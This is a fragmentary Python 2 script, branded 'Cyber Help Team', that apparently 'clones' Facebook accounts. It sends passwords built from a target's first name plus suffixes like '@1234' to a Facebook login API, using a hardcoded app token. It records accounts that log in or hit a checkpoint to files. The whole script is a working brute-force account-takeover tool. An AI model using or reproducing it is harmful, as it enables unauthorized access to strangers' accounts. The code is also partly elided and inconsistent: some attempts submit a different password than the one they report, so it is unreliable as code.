...
────█▌▀▄──▄▄──▄▀▐█────
───▐██──▀▀──▀▀──██▌───       
C̩̙̪͙̮̖͚͖̘̗̦͈ͧ̔͆ͫ̏̄̽̔͆̒̊ͦy̶͘͡b̦̣̟̳̦͈͍̖̒͆̓̈́ͣ̌̑̚ẻ̶̸̩͇͇̤̬̤̠̱͖̹̟̤ͥͩ͐ͭ͗ͣͮ̋́͛̆ͣͅr̳̞ͅ ̮̮̽̎H̒͏̛͞é̱̰̗̻͉̤͙̼l̞͓͚͕̖̯̜̤̥̱̥̭͖̮̄͋̈̌ͦ͋̋̅̇̈̌ͤͮ̏p͋͛͑ͨͨ̀̔͗ͭ͐̈ͫͪ͊͆͡͠ T͓̮̩͍̖̠̯̪̺̹̖͟e̻̟̼̜̹̮̬̝͇̮͈͕ḁ̫̳̻̫͉̫ͭ̀̇ͬ̋̾̅m̼͈̂ͧ͠͡                                                   
...
jalan("   \033[1;93m WELCOME To CYBER HELP TIME")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mCHT\033[1;96m•◈•──────────•◈•")
...
def menu():
	...
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Clonig"	
...
def pilih_super():
	...
	jalan('                    \033[1;97mRana start cloning Wait...')
	print  "  \033[1;36;48m ●══════════════════◄►══════════════════●" 
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							cekpoint.append(user+pass9)
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass10 + ' 👽 ' + b['name']
									...
									pass11 = b['first_name'] + '@1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass11 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass11 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass12 + ' 👽 ' + b['name']
										oks.append(user+pass12)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass12 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass13 + ' 👽 ' + b['name']
										oks.append(user+pass13)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass13 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
									...
									pass14 = b['first_name'] + '@123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass14 + ' 👽 ' + b['name']
										oks.append(user+pass14)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass14 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
									...
									pass15 = b['first_name'] + '+1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass15 + ' 👽 ' + b['name']
										oks.append(user+pass15)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass15 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
